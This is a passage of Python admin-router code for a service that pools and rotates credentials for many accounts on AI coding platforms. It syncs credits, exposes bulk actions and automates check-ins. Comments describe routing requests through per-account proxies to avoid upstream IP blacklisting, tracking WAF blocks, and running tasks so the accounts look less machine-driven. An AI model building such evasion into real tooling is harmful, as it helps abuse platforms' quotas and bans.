    积分包」列表并支持「查看全部积分包」，靠的就是手里有逐包数据。原先只存一个
    汇总数字，界面就只能显示一个总额，用户没法判断到底哪个包先作废。
    """
    from admin import credits as credit_rules

    collection = getattr(packages, "metadata", None)
    if collection and not collection["complete"]:
        try:
            previous = json.loads(acc.credits_snapshot or "{}")
        except (ValueError, TypeError):
            previous = {}
        if not isinstance(previous, dict):
            previous = {}
        previous = {**credit_rules.summarize_account(previous.get("resources") or []), **previous}
        previous["collection"] = {**collection, "snapshot_preserved": True}
        acc.credits_snapshot = json.dumps(previous, ensure_ascii=False)
        return previous
    now = credit_rules.now_ms()
    normalized = credit_rules.normalize_packages(packages, now)
    summary = credit_rules.summarize_account(normalized, now)

    acc.credits_expiring = _compute_expiring(normalized)      # 旧口径，保持兼容
    acc.credits_expiring_soon = int(summary["expiring_soon_remaining"])
    acc.credits_evergreen = int(
        sum(r["remaining"] for r in normalized
            if r["remaining"] > 0 and not r["expire_at"]))
    acc.credits_expired = int(summary["expired_remaining"])
    acc.credits_soonest_expire_at = credit_rules.as_datetime(summary["soonest_expire_at"])
    acc.credits_snapshot = json.dumps(
        {**summary, "collection": collection,
         "resources": [{k: v for k, v in r.items()} for r in normalized]},
        ensure_ascii=False)
    acc.credits_synced_at = datetime.utcnow()
    return summary


def _remember_upstream_error(acc: Account, error) -> dict:
    from admin.request_metrics import exception_text
    safe_error = exception_text(error)
    raw = getattr(error, 'raw_body', safe_error)
    status = getattr(error, 'http_status', 0)
    info = upstream_errors.error_info(raw, status)
    acc.last_upstream_error = json.dumps(info, ensure_ascii=False)
    acc.last_err_at = datetime.utcnow()
    acc.last_err_msg = safe_error[:255]
    return info


def _refresh_balance(acc: Account, with_expiry: bool = False, on_error=None,
                     proxy: str = "") -> bool:
    """刷新账号余额。

    Args:
        with_expiry: 是否同时同步**积分包到期快照**（剩余额度按包拆分）。
            需要多打一次 `fetch_credit_details`（约 0.4s），
            所以只在整点定时任务与「刷新全部」里开 —— 高频路径（登录后收尾）不开，
            但**至少会保留上一次的值**，不会因为不刷新就被清零。
        proxy: 本次请求的出站出口（空 = 直连）。批量任务按代理槽传入，
            避免几百个号共用一个 IP 被上游拉黑。
    """
    try:
        with backend.AccountSession(acc.auth_json, proxy=proxy) as sess:
            bal = sess.fetch_balance()
            acc.balance_total = int(bal.get("total", 0) or 0)
            acc.balance_remain = int(bal.get("remain", 0) or 0)
            if with_expiry:
                try:
                    _sync_credit_snapshot(acc, sess.fetch_credit_details())
                except Exception as error:
                    _remember_upstream_error(acc, error)
                    if on_error:
                        on_error(error)
            acc.auth_json = sess.updated_json()  # 回写可能刷新的 token
        acc.last_sync_at = datetime.utcnow()
        # 只有重载刷新任务读这个字段，用来判断「哪些号本轮该刷」。
        # 单独一个字段是必须的：`last_sync_at` 会被导入探活 / 签到回写
        # 一起更新，用它会把「刚导入的号」误判成「刚刷过余额」。
        acc.balance_synced_at = acc.last_sync_at
        return True
    except Exception as error:
        _remember_upstream_error(acc, error)
        if on_error:
            on_error(error)
        return False


def _credit_fields(a: Account) -> dict:
    """账号记录里的积分到期字段 → 前端可直接用的结构。

    `credits_snapshot` 存的是完整汇总 JSON（含逐包明细）。解析失败时
    降级为「只有汇总数字、没有明细」，绝不让一条坏数据把整个列表打挂
    —— 列表是运维最常用的入口，宁可少显示也不要 500。
    """
    snap = {}
    raw = (a.credits_snapshot or "").strip()
    if raw:
        try:
            parsed = json.loads(raw)
            if isinstance(parsed, dict):
                snap = parsed
        except Exception:
            snap = {}

    from admin import credits as credit_rules

    soonest_ms = None
    if a.credits_soonest_expire_at:
        soonest_ms = int(a.credits_soonest_expire_at.replace(
            tzinfo=timezone.utc).timestamp() * 1000)
    resources = snap.get("resources") or []

    def _slim(r: dict) -> dict:
        """只带列表展示真正用到的字段。

        快照里的每个包有 ~10 个字段（含 package_name / days_left / status / used…），
        而列表每行只画「剩余额度 + 包名 + 到期日」三样。xx 个账号 × 全部包
        （实测可达数百条）会把响应从几十 KB 顶到近 200 KB，且随账号数线性增长 ——
        这正是「越用越卡」的来源。完整字段走单账号明细接口。
        """
        return {
            "package_code": r.get("package_code") or "",
            "display_name": r.get("display_name") or r.get("package_name") or "积分包",
            "remaining": round(float(r.get("remaining") or 0), 4),
            "total": round(float(r.get("total") or 0), 4),
            "expire_at": r.get("expire_at"),
            "expire_label": credit_rules.format_expire_at(r.get("expire_at")),
            "expire_date": credit_rules.expire_date_label(r.get("expire_at")),
            "expiring_soon": bool(r.get("expiring_soon")),
            "expired": bool(r.get("expired")),
        }

    return {
        "credits_expiring": int(a.credits_expiring or 0),          # 旧 30 天口径
        "credits_expiring_soon": int(a.credits_expiring_soon or 0),  # 严格 7 天口径
        "credits_evergreen": int(a.credits_evergreen or 0),
        "credits_expired": int(a.credits_expired or 0),
        "credits_soonest_expire_at": soonest_ms,
        "credits_soonest_days_left": snap.get("soonest_days_left"),
        "credits_synced_at": a.credits_synced_at.isoformat() if a.credits_synced_at else None,
        "credits_collection": snap.get("collection"),
        "credits_package_count": int(snap.get("package_count") or 0),
        "credits_active_package_count": int(snap.get("active_package_count") or 0),
        # 「最近快到期的积分包」：明细已按到期升序，取前 3 个供列表行直接渲染。
        # **不再返回全量 `credits_resources`** —— 前端从未用过它（见 index.html
        # 的 grep：只有 credits_next_expiring 被读取），纯属响应体积负担。
        "credits_next_expiring": [_slim(r) for r in resources[:3]],
    }


@router.get("")
def list_accounts(request: Request = None,
                  _: bool = Depends(require_admin),
                  db: Session = Depends(get_db)):
    """账号池列表。

    **必须按平台作用域收窄**：这张表混装着 WorkBuddy / Trae 国内版 /
    Trae 国际版的账号。原来直接 `query(Account).all()`，于是切到 WorkBuddy
    会看到 5 个号（其实是 2 个 WorkBuddy + 3 个 Trae）—— 数据串了。

    三态语义与其它面板一致：没指定平台 -> 全部；指定了但没号 -> 空列表。
    """
    from admin.platform import scope as platform_scope

    platform, realm = platform_scope.from_request(request)
    # `?all_platforms=1` 时**忽略平台作用域**，返回全部平台的账号。
    #
    # 用途：创建 Key 时的「独占平台 + 账号多选」需要看到所有平台的号，
    # 而默认行为是按当前平台收窄（那是账号池面板的正确语义）。
    all_platforms = False
    try:
        raw = (request.query_params.get("all_platforms") or "").lower()
        all_platforms = raw in ("1", "true", "yes")
    except Exception:  # noqa: BLE001 - 测试桩可能没有 query_params
        all_platforms = False

    # ---- 服务端分页 / 搜索 / 筛选（大号池优化）----
    # 无 `page` 参数 = 旧的全量行为（Key 表单多选等旧调用方不受影响）；
    # 前端账号池传 page 后只回当前页 + SQL 聚合 summary。
    from admin.platform.shared import (list_page_params, apply_account_filters,
                                       account_order, summarize_accounts_sql)

    lp = list_page_params(request)

    query = db.query(Account)
    if not all_platforms:
        query = platform_scope.filter_accounts(query, db, platform, realm)
    query = apply_account_filters(
        query, Account, search=lp["search"], status=lp["status"],
        min_credits=lp["min_credits"], max_credits=lp["max_credits"])
    query = account_order(query, Account, lp["sort"])

    if not lp["paginated"]:
        rows = query.all()
        total = len(rows)
    else:
        total = int(query.with_entities(func.count(Account.id)).scalar() or 0)
        rows = (query.offset((lp["page"] - 1) * lp["page_size"])
                .limit(lp["page_size"]).all())
    owners = binding_owners(db)
    now = datetime.utcnow()
    limits = _active_model_limits(db, now)
    from admin.post_login import states
    automation = states(db, [a.id for a in rows])
    resources = states(db, [a.id for a in rows], prefix='account_resources:')
    items = [
        {
            "id": a.id,
            "name": a.name,
            "uid": a.uid,
            "enterprise_id": a.enterprise_id,
            # 落库平台名（workbuddy / trae / qoder / loomy）。
            # Key 表单的「独占平台 + 账号多选」靠它做过滤；
            # 缺了它前端只能看到一堆账号、分不清属于哪个平台。
            "platform": (a.platform or "").lower(),
            "domain": a.domain,
            "status": a.status,
            "max_in_flight": a.max_in_flight,
            "bound_key_id": owners[a.id].id if owners.get(a.id) else None,
            "bound_key_name": owners[a.id].name if owners.get(a.id) else "",
            "balance_total": a.balance_total,
            "balance_remain": a.balance_remain,
            "last_sync_at": a.last_sync_at.isoformat() if a.last_sync_at else None,
            "last_used_at": a.last_used_at.isoformat() if a.last_used_at else None,
            "created_at": a.created_at.isoformat() if a.created_at else None,
            "model_limits": limits.get(a.id, []),
            "upstream_error": upstream_errors.stored_info(a.last_upstream_error, a.last_err_msg),
            "post_login_automation": automation.get(a.id),
            "resource_initialization": resources.get(a.id),
            **_gateway_fields(a, now),
            **_credit_fields(a),
            **_token_fields(a),
        }
        for a in rows
    ]
    # 汇总口径：**积分类合计一律只算 active 账号**。
    #
    # 原来这里把全部账号（含已禁用/登录失效的）一起加进 balance_remain /
    # credits_expiring_soon，导致两个问题：
    #   1. 与「积分到期」面板对不上 —— 那个面板只算 active，
    #      于是同一块屏上一个显示 xx、另一个显示 yy（两者相差 xx，
    #      正是 6 个禁用号里根本用不到的额度）；
    #   2. 数字只增不减：账号登录失效被禁用后，它的余额仍被算进「可用积分」，
    #      看到的是「号少了但积分没少」。
    #
    # 已禁用账号那部分**不隐藏、但单独给**（disabled_*），
    # 这样既不污染「可用」，又不至于让人以为数据丢了。
    if lp["paginated"]:
        # ---- 分页模式：summary 走 **SQL 聚合**（同平台/搜索/积分筛选，
        # 但**不含状态筛选**——筛选 tab 的计数要显示全池分布，不能被
        # 当前 tab 自己过滤掉）。令牌统计（token_*/renewal_*）需要逐号
        # 解析凭证 JSON，只有全量模式才有；分页模式的消费方（账号池
        # 概览卡）不读这些键。
        agg_q = db.query(Account)
        if not all_platforms:
            agg_q = platform_scope.filter_accounts(agg_q, db, platform, realm)
        agg_q = apply_account_filters(
            agg_q, Account, search=lp["search"], status="",
            min_credits=lp["min_credits"], max_credits=lp["max_credits"])
        summary = summarize_accounts_sql(agg_q, Account)
        return {"items": items, "summary": summary, "paginated": True,
                "total": total, "page": lp["page"],
                "page_size": lp["page_size"]}
    active_items = [i for i in items if i["status"] == "active"]
    disabled_items = [i for i in items if i["status"] != "active"]
    # 令牌统计的样本：只看支持这套凭证结构的平台（见 `_token_fields`）。
    token_items = [i for i in active_items if i.get("token_supported")]
    summary = {
        "total": len(items),
        "active": len(active_items),
        "disabled": len(disabled_items),
        "available": sum(1 for i in active_items if i["balance_remain"] > 0),
        # —— 可用口径（只看 active），与 /api/credits/expiry 保持一致 ——
        "balance_total": sum(i["balance_total"] for i in active_items),
        "balance_remain": sum(i["balance_remain"] for i in active_items),
        "credits_expiring_soon": sum(i["credits_expiring_soon"] for i in active_items),
        "credits_evergreen": sum(i["credits_evergreen"] for i in active_items),
        "credits_expired": sum(i["credits_expired"] for i in active_items),
        "expiring_accounts": sum(
            1 for i in active_items if i["credits_expiring_soon"] > 0),
        "soonest_expire_at": min(
            (i["credits_soonest_expire_at"] for i in active_items
             if i["credits_soonest_expire_at"]),
            default=None),
        # —— 令牌有效期（只看 active：禁用号是否过期已无意义）——
        #
        # 这里必须给**两条**时间线的汇总，不能只报 access：
        # access 是 30 天的短周期、过期后一道刷新就回来，它「快到期」其实
        # 是正常状态；真正决定账号死活的是 refresh 窗口（60 天）。只盯着
        # token_expiring 会让人天天看到「剩 N 天」而实际一点事没有。
        #
        # 统计范围：只算 `token_supported=True` 的号（当前即 WorkBuddy）。
        # 别的平台凭证形状不同（顶层 token / expiredAt），解析必然 unknown ——
        # 把它们算进来会让「6 个号有效期未知」这种假警报常年亮着。
        "token_expiring": sum(1 for i in token_items if i["token_state"] == "expiring"),
        "token_expired": sum(1 for i in token_items if i["token_state"] == "expired"),
        "token_unknown": sum(1 for i in token_items if i["token_state"] == "unknown"),
        "token_soonest_expire_at": min(
            (i["token_expires_at"] for i in token_items if i["token_expires_at"]),
            default=None),
        #: 续期窗口（refreshToken）—— 真正的死亡线
        "renewal_expiring": sum(
            1 for i in token_items if i["renewal_state"] == "expiring"),
        "renewal_expired": sum(
            1 for i in token_items if i["renewal_state"] == "expired"),
        "renewal_unknown": sum(
            1 for i in token_items if i["renewal_state"] == "unknown"),
        "renewal_soonest_expire_at": min(
            (i["renewal_expires_at"] for i in token_items if i["renewal_expires_at"]),
            default=None),
        #: 还能靠刷新救回来的号数 —— 跑一次保活就复活，不需要人工重登。
        "renewable_accounts": sum(1 for i in token_items if i.get("renewable")),
        # —— 已禁用账号那部分：透明展示，但不计入上面的「可用」——
        "disabled_balance_remain": sum(i["balance_remain"] for i in disabled_items),
        "disabled_credits_expiring_soon": sum(
            i["credits_expiring_soon"] for i in disabled_items),
    }
    return {"items": items, "summary": summary}


def _as_iso(value):
    """把平台报的到期时间统一成 ISO 字符串。

    ## 为什么要这个兼容层（2026-11-06 踩过）

    一开始这里直接 `expires_at.isoformat()`，因为 WorkBuddy 的实现返回的是
    `datetime`。后来给 Trae / Qoder / 小浣熊 / CodeArts / Loomy 补
    `credential_expiry` 时用的是 **epoch 秒**（int），于是账号列表直接
    500：

        AttributeError: 'int' object has no attribute 'isoformat'

    平台的「到期时间」本质就是时间点，`datetime` 和 epoch 都是合理表达 ——
    所以应该由**消费方**（这里）统一，而不是要求所有平台迁就一种写法。
    """
    if value is None or value == "":
        return None
    if hasattr(value, "isoformat"):
        return value.isoformat()
    try:
        number = float(value)
    except (TypeError, ValueError):
        return str(value)
    if number <= 0:
        return None
    # 上游偶尔给毫秒
    if number > 1e11:
        number /= 1000.0
    return datetime.utcfromtimestamp(number).isoformat() + "Z"


def _token_fields(a: Account) -> dict:
    """令牌有效期视图（读时解析，不落库）。

    两条时间线都要给，理由见平台模块的 credential_expiry 注释：
    短期令牌（30 天）过期后刷新即可复活；续期窗口（60 天滑动）才是真正的
    死亡线。前端据此显示两种不同颜色的徽标。

    **平台无关**：具体怎么解析由各平台的 Gateway 决定
    （`Gateway.credential_expiry`），本函数只负责把结果摊平成前端字段。
    不支持这个能力的平台会拿到 `token_supported=False`，前端据此不渲染
    任何徽标 —— 而不是给一批正常账号挂上红色「无法解析」。

    解析失败（凭证格式异常、本机无解密密钥）时降级为 `unknown`，
    **绝不因为一个坏号让整页列表 500**。
    """
    from admin.credential_expiry import credential_expiry

    info = credential_expiry(a)
    return {
        "token_supported": bool(info.get("supported")),
        # —— 线一：短期令牌 ——
        "token_expires_at": _as_iso(info.get("expires_at")),
        "token_days_left": info.get("days_left"),
        "token_state": info.get("state"),
        # —— 线二：续期窗口 ——
        "renewal_expires_at": _as_iso(info.get("refresh_expires_at")),
        "renewal_days_left": info.get("refresh_days_left"),
        "renewal_state": info.get("refresh_state"),
        "renewal_known": info.get("renewal_known", False),
        # —— 综合：这个号还能不能靠刷新救回来 ——
        "renewable": info.get("renewable", False),
        "has_refresh_token": info.get("has_refresh", False),
    }


def _gateway_fields(a: Account, now: datetime) -> dict:
    states = [(a.cool_until, a.cool_kind or "cooling"),
              (a.breaker_until, "breaker"), (a.degrade_until, "degraded")]
    until, reason = max(((t, kind) for t, kind in states if t and t > now),
                        default=(None, ""), key=lambda entry: entry[0])
    return {
        "gateway_state": "disabled" if a.status != "active" else "cooling" if until else "ready",
        "gateway_until": until.isoformat() + "Z" if until else None,
        "gateway_reason": reason,
    }


def _active_model_limits(db: Session, now: datetime) -> dict:
    result = {}
    for row in db.query(AccountModelCooldown).filter(AccountModelCooldown.until > now).all():
        # Old daily entries may have been stored as model_rate; report accurately.
        from admin.routers.proxy import _MODEL_RATE_CODES
        evidence = upstream_errors.stored_info(row.upstream_error, row.reason or '')
        code = evidence.get('code')
        daily = code in _MODEL_RATE_CODES or (not code and row.kind == 'model_daily')
        from admin.model_limits import queue_retry_time
        if row.reset_source:
            source = row.reset_source
        elif (row.reason or "").startswith("[estimated]"):
            source = "estimated"
        elif (row.reason or "").startswith("[upstream]"):
            source = "upstream"
        elif row.kind == "model_queue" and queue_retry_time(row.reason or "", now):
            source = "queue_retry"
        else:
            source = "backoff"
        result.setdefault(row.account_id, []).append({
            "model": row.model,
            "kind": "model_daily" if daily else row.kind,
            "until": row.until.isoformat() + "Z",
            "remaining_seconds": max(0, int((row.until - now).total_seconds())),
            "reset_source": source,
            "hits": row.hits or 0,
            "upstream_code": code,
            "upstream_error": evidence,
            "quota_total": None,
            "quota_remaining": None,
        })
    return result


@router.get("/model-limits")
def model_limits(_: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """Observed account/model limits + gateway usage; no upstream polling."""
    now = datetime.utcnow()
    rows = db.query(Account).all()
    limits = _active_model_limits(db, now)
    public_ids = {a.id for a in scope_accounts(db.query(Account)).all()}
    start = (now + timedelta(hours=8)).replace(hour=0, minute=0, second=0, microsecond=0) - timedelta(hours=8)
    usage = {(account_id, model): {"requests_today": count, "successes_today": int(successes or 0),
                                  "tokens_today": int(tokens) if tokens is not None else None}
             for account_id, model, count, successes, tokens in db.query(
                 UsageLog.account_id, UsageLog.model, func.count(UsageLog.id),
                 func.sum(case((UsageLog.error_kind.in_(('', 'success')), 1), else_=0)),
                 func.sum(UsageLog.total_tokens))
             .filter(UsageLog.created_at >= start)
             .group_by(UsageLog.account_id, UsageLog.model).all()}
    items = []
    for account in rows:
        for entry in limits.get(account.id, []):
            items.append({**entry, "account_id": account.id,
                          "account_name": account.name or account.uid,
                          "account_status": account.status,
                          **usage.get((account.id, entry["model"]),
                                      {"requests_today": 0, "successes_today": 0, "tokens_today": None})})
    from admin.pool import POOL
    from admin.routers.proxy import _looks_login_dead
    summary = []
    configs = {c.model_id: c for c in db.query(ModelConfig).filter(ModelConfig.enabled == 1, ModelConfig.level == "system").all()}
    for model in sorted(set(configs) | {e["model"] for e in items}):
        config = configs.get(model)
        free = config is not None and config.credit_multiplier == 0
        blocked = {e["account_id"] for e in items if e["model"] == model}
        available = [a for a in rows if a.id in public_ids and a.status == "active" and a.id not in blocked
                     and _gateway_fields(a, now)["gateway_state"] == "ready"
                     and not _looks_login_dead(a, now) and not POOL.waf.active()
                     and (free or (a.balance_remain or 0) > 0)
                     and not POOL.inflight.full(a.uid or "", settings.MAX_IN_FLIGHT)]
        summary.append({"model": model, "free": free,
                        "available_accounts": len(available), "limited_accounts": len(blocked),
                        "requests_today": sum(v["requests_today"] for (_, m), v in usage.items() if m == model),
                        "tokens_today": sum(v["tokens_today"] or 0 for (_, m), v in usage.items() if m == model)})
    return {"items": items, "models": summary, "observed_at": now.isoformat() + "Z",
            "waf_remaining_seconds": POOL.waf.remaining(),
            "usage_scope": "gateway_only", "daily_quota_total": None,
            "account_errors": [{"account_id": a.id, "account_name": a.name or a.uid,
                                "gateway_state": _gateway_fields(a, now),
                                "upstream_error": upstream_errors.stored_info(a.last_upstream_error, a.last_err_msg)}
                               for a in rows if a.last_err_msg or a.last_upstream_error]}


class ClearModelLimit(BaseModel):
    model: str


@router.post("/{acc_id}/model-limits/clear")
def clear_model_limit(acc_id: int, body: ClearModelLimit,
                      _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    if not db.query(Account).filter(Account.id == acc_id).first():
        raise HTTPException(status_code=404, detail="账号不存在")
    count = db.query(AccountModelCooldown).filter(
        AccountModelCooldown.account_id == acc_id,
        AccountModelCooldown.model == body.model).delete(synchronize_session=False)
    db.commit()
    return {"ok": True, "cleared": count}


@router.post("/{acc_id}/cooldown/clear")
def clear_account_cooldown(acc_id: int,
                           _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """清除账号级冷却（cool_until / 熔断 / 降权），让该号立刻重新参与调度。

    只清**本地调度状态**，不动官方额度、不动模型级冷却（那是另一条台账）。
    连败/熔断计数一并清零 —— 否则残留计数会在下次失败时立刻再叠一层冷却。
    登录态失效计数（session_dead_fails）保留：那是登录健康问题，不该被
    「解除冷却」悄悄洗掉。
    """
    acc = db.query(Account).filter(Account.id == acc_id).first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")
    was_cooling = bool(
        (acc.cool_until and acc.cool_until > datetime.utcnow())
        or (acc.breaker_until and acc.breaker_until > datetime.utcnow())
        or (acc.degrade_until and acc.degrade_until > datetime.utcnow())
    )
    acc.cool_until = None
    acc.cool_kind = ""
    acc.breaker_until = None
    acc.degrade_until = None
    acc.err_count = 0
    acc.breaker_fails = 0
    acc.consecutive_fails = 0
    db.commit()
    return {"ok": True, "cleared": was_cooling}


@router.post("")
def add_account(body: AccountIn, _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    body.auth_json = _decode_or_400(body.auth_json)
    # 第一道：只收「auth 之后的授权 JSON」，非凭证一律 400
    _reject_non_credential(body.auth_json)
    # 第二道：**真调上游**确认凭证可用、非伪造，并取回真实账号信息 + 余额
    profile, balance = _verify_credential_live_or_400(body.auth_json)

    # 按 uid 去重：同一个人重复添加只会产生垃圾记录，
    # 而且会让批量任务对同一个号跑多次（白等、看起来像卡住）
    dup = _find_dup(db, body.auth_json)
    if dup:
        # 重复上传 = 用新凭证覆盖 + 刷新余额（原来直接 return，
        # 于是重传一份新凭证后列表还显示旧余额，看起来「没生效」）
        _apply_meta(dup, body.auth_json, profile=profile, balance=balance)
        db.commit()
        _post_login_automation(dup.id, dup.name or dup.uid)
        return {"id": dup.id, "name": dup.name, "ok": True,
                "duplicated": True,
                "message": f"该账号已存在（id={dup.id}），已用新凭证覆盖更新"}
    acc = Account(name=clean_display_name(body.name)) if body.name else Account()
    _apply_meta(acc, body.auth_json, profile=profile, balance=balance)
    db.add(acc)
    db.commit()
    db.refresh(acc)
    _refresh_balance(acc, with_expiry=True)
    db.commit()
    _post_login_automation(acc.id, acc.name or acc.uid)
    return {"id": acc.id, "name": acc.name, "ok": True, "duplicated": False,
            "verified": True, "balance_remain": acc.balance_remain}


def _reauthenticate_account(db: Session, acc_id: int, credential: str,
                          profile: dict, balance: dict) -> Account:
    acc = db.query(Account).filter(Account.id == acc_id).with_for_update().first()
    if acc is None:
        raise HTTPException(404, "原账号不存在，请刷新列表")
    old_uid = str(acc.uid or _uid_of(acc.auth_json) or "")
    new_uid = str(profile.get("uid") or _uid_of(credential) or "")
    if not old_uid or not new_uid or old_uid != new_uid:
        raise HTTPException(409, "登录身份与原账号不一致，未替换凭证；请使用原账号重新登录")
    _apply_meta(acc, credential, profile=profile, balance=balance)
    acc.status = "active"
    acc.session_dead_fails = 0
    acc.consecutive_fails = 0
    acc.breaker_fails = 0
    acc.breaker_until = None
    acc.degrade_until = None
    # Logging in does not restore upstream quota or remove model daily limits.
    if acc.cool_kind in ("session_dead", "transport", "upstream_5xx"):
        acc.cool_kind = ""
        acc.cool_until = None
    acc.last_err_msg = ""
    acc.last_err_at = None
    acc.last_upstream_error = ""
    return acc


@router.post("/{acc_id}/reauth")
def reauthenticate_account(acc_id: int, body: AccountIn,
                           _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    credential = _decode_or_400(body.auth_json)
    _reject_non_credential(credential)
    profile, balance = _verify_credential_live_or_400(credential)
    acc = _reauthenticate_account(db, acc_id, credential, profile, balance)
    db.commit()
    return {"ok": True, "id": acc.id, "message": "凭证已更新，原账号 ID、排序、Key 绑定及历史记录已保留"}


class AccountBulkIn(BaseModel):
    """批量动作入参。"""
    action: str = ""
    ids: list[int] = []


@router.post("/{acc_id}/task")
def run_account_task(acc_id: int, body: dict,
                     _: bool = Depends(require_admin),
                     db: Session = Depends(get_db)):
    """给**单个账号**跑一个平台任务：签到 / 新手任务 / 活跃对话。

    用户的原话：「没有单个账号的操作，签到、任务之类的，其它平台也是一样的」。
    这些任务原来只有「全池」入口（平台卡的按钮或定时任务），想给某一个号
    补一次签到就得跑整池，既慢又制造机器特征。

    这里按 `账号归属平台` 分派到各平台的服务层；平台没实现该任务时回
    `supported: false` + 原因，而不是 500 —— 前端据此不显示那个按钮。
    """
    action = str((body or {}).get("task") or (body or {}).get("action") or "").strip().lower()
    if not action:
        raise HTTPException(400, "缺少 task")
    account = db.query(Account).filter(Account.id == acc_id).first()
    if account is None:
        raise HTTPException(404, "账号不存在")
    storage = str(account.platform or "").lower()

    try:
        if action == "checkin":
            if storage == "loomy":
                from admin.platform.loomy.services import checkin as svc

                item = svc.checkin_one(db, account)
                return {"ok": bool(item.get("ok")), "task": action,
                        "account_id": acc_id, "item": item,
                        "summary": item.get("reason") or ""}
            if storage == "wps-lingxi":
                from admin.platform.wps_lingxi.services import checkin as svc

                item = svc.checkin_account(db, account)
                return {"ok": bool(item.get("ok")), "task": action,
                        "account_id": acc_id, "item": item,
                        "summary": item.get("reason") or ""}
            if storage == "qoder":
                from admin.platform.qoder.services import checkin as svc

                # Qoder 的签到是「活动领取」，按账号跑一遍即可
                result = svc.run_daily_checkin(db, None, account.domain or "cn")
                row = next((r for r in (result.get("items") or [])
                            if int(r.get("account_id") or 0) == acc_id), {})
                return {"ok": bool(row.get("ok", result.get("ok"))), "task": action,
                        "account_id": acc_id, "item": row,
                        "summary": row.get("reason") or result.get("summary") or ""}
            return {"ok": False, "supported": False, "task": action,
                    "reason": "%s 平台没有单账号签到入口" % (storage or "该")}

        if action == "onboarding":
            if storage == "loomy":
                from admin.platform.loomy.services import onboarding as svc

                result = svc.run_all(db, account.domain or "cn", limit=0)
                row = next((r for r in (result.get("items") or [])
                            if int(r.get("account_id") or 0) == acc_id), {})
                return {"ok": bool(row.get("ok", True)), "task": action,
                        "account_id": acc_id, "item": row,
                        "gained": int(row.get("gained") or 0),
                        "summary": ("+%d 积分" % int(row.get("gained") or 0))
                                   if row.get("gained") else (row.get("reason") or "已全部完成")}
            return {"ok": False, "supported": False, "task": action,
                    "reason": "只有 Loomy 有新手任务（一次性积分）"}

        if action == "activity":
            if storage == "wps-lingxi":
                from admin.platform.wps_lingxi.services import activity as svc

                item = svc.activate_account(db, account)
                return {"ok": bool(item.get("ok")), "task": action,
                        "account_id": acc_id, "item": item,
                        "summary": item.get("reason") or item.get("answer") or ""}
            return {"ok": False, "supported": False, "task": action,
                    "reason": "%s 平台没有「活跃对话」任务" % (storage or "该")}
    except Exception as exc:  # noqa: BLE001 - 单号任务失败如实回，不 500
        logger.exception("单账号任务失败 acc=%s task=%s", acc_id, action)
        raise HTTPException(400, "%s 失败：%s" % (action, str(exc)[:160])) from exc

    raise HTTPException(400, "不支持的任务：%s" % action)


@router.post("/bulk")
def bulk_mutate(body: AccountBulkIn, _: bool = Depends(require_admin),
                db: Session = Depends(get_db)):
    """对**勾选的一批账号**执行同一个动作（全平台生效）。

    ## 为什么需要它

    账号池支持「勾选」，但勾上之后**没有任何批量入口**：想停用 20 个号只能
    一个个点。用户反馈「勾选了表格之后对应批量操作的按钮出现，比如批量删除、
    禁用、导入等，全平台生效」。

    ## 语义

    `action` 取值：
      `enable`   启用（status=active），清掉冷却/熔断残留
      `disable`  停用（status=disabled），保留账号与绑定
      `delete`   物理删除（不可恢复）
      `refresh`  逐个刷新额度 + token（串行，上游限速友好）
      `check`    逐个探活（只标记状态，不改凭证）

    **不按当前平台过滤**：勾选本身就是明确意图；跨平台勾选是允许的
    （例如「把所有 0 积分的号停掉」）。每个 id 单独处理，坏一个不影响其余，
    结果里给出 `affected / skipped / errors`，前端据此提示。
    """
    action = str(body.action or "").strip().lower()
    ids = [int(i) for i in (body.ids or []) if str(i).strip().lstrip("-").isdigit()]
    ids = sorted(set(i for i in ids if i > 0))
    if not ids:
        raise HTTPException(400, "没有选中任何账号")
    if len(ids) > 2000:
        raise HTTPException(400, "单次最多操作 2000 个账号")
    if action not in ("enable", "disable", "delete", "refresh", "check"):
        raise HTTPException(400, "不支持的批量动作：%s" % action)

    rows = db.query(Account).filter(Account.id.in_(ids)).all()
    found = {row.id: row for row in rows}
    missing = [i for i in ids if i not in found]
    affected, skipped, errors = 0, [], []

    if action in ("enable", "disable"):
        target = "active" if action == "enable" else "disabled"
        for acc_id in ids:
            account = found.get(acc_id)
            if account is None:
                continue
            account.status = target
            if target == "active":
                # 启用时清掉冷却类残留：否则"启用了但还是不接请求"，
                # 用户会以为批量启用没生效。
                account.cool_until = None
                account.cool_kind = ""
                account.breaker_until = None
                account.degrade_until = None
            affected += 1
        db.commit()

    elif action == "delete":
        # 绑定了 Key 的号删掉会让 Key 失去专属账号 —— 如实报告，不静默改绑定。
        bound = {}
        try:
            from admin.models import ApiKey

            for key in db.query(ApiKey).filter(ApiKey.account_id.in_(ids)).all():
                bound.setdefault(int(key.account_id or 0), []).append(key.name or ("#%s" % key.id))
        except Exception:  # noqa: BLE001 - 读不到绑定不影响删除
            bound = {}
        for acc_id in ids:
            account = found.get(acc_id)
            if account is None:
                continue
            try:
                db.delete(account)
                affected += 1
            except Exception as exc:  # noqa: BLE001
                errors.append("#%s 删除失败：%s" % (acc_id, str(exc)[:80]))
        db.commit()
        for acc_id, names in bound.items():
            skipped.append("#%s 删除前被 Key 独占绑定：%s" % (acc_id, "、".join(names[:3])))

    else:  # refresh / check
        from admin.platform import registry

        for acc_id in ids:
            account = found.get(acc_id)
            if account is None:
                continue
            platform = str(account.platform or "").lower()
            spec = registry.get(platform) or None
            storage = str(getattr(spec, "storage", lambda: platform)() if spec else platform)
            try:
                if action == "refresh":
                    _refresh_one(storage, account, db)
                else:
                    _check_one(storage, account, db)
                affected += 1
            except Exception as exc:  # noqa: BLE001 - 单个号失败不影响批量
                errors.append("#%s：%s" % (acc_id, str(exc)[:90]))
        db.commit()

    if missing:
        skipped.append("有 %d 个账号已不存在（可能已被删除）" % len(missing))
    return {"ok": True, "action": action, "requested": len(ids),
            "affected": affected, "skipped": skipped[:20], "errors": errors[:20],
            "note": "" if affected else "没有任何账号被修改"}


def _refresh_one(storage: str, account: Account, db: Session) -> None:
    """批量「刷新额度」：优先调平台自己的服务层（口径与单号刷新一致）。"""
    if storage == "trae":
        from admin.platform.trae.services import accounts as svc

        svc.refresh(db, account)
        return
    if storage == "loomy":
        from admin.platform.loomy.services import accounts as svc

        svc.sync_quota(db, account, with_models=False)
        return
    if storage == "qoder":
        from admin.platform.qoder.services import accounts as svc

        svc.sync_quota(db, account)
        return
    if storage == "wps-lingxi":
